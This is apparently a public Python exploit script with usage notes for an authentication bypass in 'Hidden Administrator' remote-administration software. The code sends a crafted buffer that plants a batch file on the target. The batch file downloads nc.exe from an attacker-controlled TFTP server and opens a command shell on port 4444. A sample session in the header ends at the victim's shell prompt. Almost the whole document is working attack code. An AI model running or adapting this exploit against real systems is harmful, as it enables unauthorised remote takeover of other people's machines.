####################################################################################
#           Hidden Administrator Authenticaiton Bypass Exploit                     
#
#                   ahmed[at]rewterz.com                                           
#
#            http://www.securityfocus.com/bid/24049                                
#
#                                                                                  
#
# C:\>python rewt-ha-exp.py                                                        
#
# Usage: rewt-ha-exp.py -h <host ip> -p <port> -t <tftpd server ip>                
#
# make sure nc.exe exists on tftpd server                                          
#
#                                                                                  
#
# C:\>telnet 192.168.1.4 4444                                                      
#
# C:\>python rewt-ha-exp.py -h 192.168.1.4 -p 3128 -t 192.168.1.105                
#
# [+] Connecting to 192.168.1.4                                                    
#
# [+] Uploading Files                                                              
#
# [+] DONE [+]                                                                     
#
# [+] Now Connect to port 4444 on victim IP !!!                                    
#
#                                                                                  
#
# C:\>telnet 192.168.1.4 4444                                                      
#
# Microsoft Windows XP [Version 5.1.2600]                                          
#
# (C) Copyright 1985-2001 Microsoft Corp.                                          
#
# C:\ha_server>                                                                    
# 
####################################################################################


import socket
import struct
import time
import sys
import getopt


def usage():
	print "\n"
	print "######################################################"
	print "# Hidden Administrator Authentication Bypass Exploit #"
	print "#           Coded By ahmed[at]rewterz.com            #"
	print "######################################################"
	print "\n"
	print "Usage: %s -h <host ip> -p <port> -t <tftpd server ip>" % 
sys.argv[0]
	print "make sure nc.exe exists on tftpd server\n"

def exploit():
	h ="%X" % (130+len(tftpd))
        
buff1='_file_manager_operations_copy_files_Loc_Rem_c:\\^file\r\n\x0brewt_ha.bat'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	
buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	buff1 += ('\\x' + h).decode('string_escape')
	buff1 += '\x00\x00\x00\x00\x00\x00\x00'
	buff1+='\x00tftp -i ' + tftpd + ' GET nc.exe c:\\nc.exe                           
'
	buff1+='\r\nc:\\nc.exe -L -d -p 4444 -e cmd.exe                 
\r\n\r\n         '
	buff1+='      
\r\n\r\n_file_manager_operations_get_cur_dir_c:\r\n'
	try:
		print "[+] Connecting to %s" %host
	        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((host,int(port)))
		print "[+] Uploading Files"
		s.send(buff1)
	        time.sleep(2)
	        s.send('+run_C:\\rewt_ha.bat|\r\n')
	        time.sleep(1)
	        print "[+] DONE [+]"
                print "[+] Now Connect to port 4444 on victim IP !!!"
	except:
		print "[+] Could not connect to the server"


if len(sys.argv)<7:
       usage()
       sys.exit()
try:
       options = getopt.getopt(sys.argv[1:], 'h:p:t:')[0]
except getopt.GetoptError, err:
       print err
       usage()
       sys.exit()


for option, value in options:
       if option == '-h':
           host = value
       if option == '-p':
           port = int(value)
       if option == '-t':
           tftpd=value
exploit()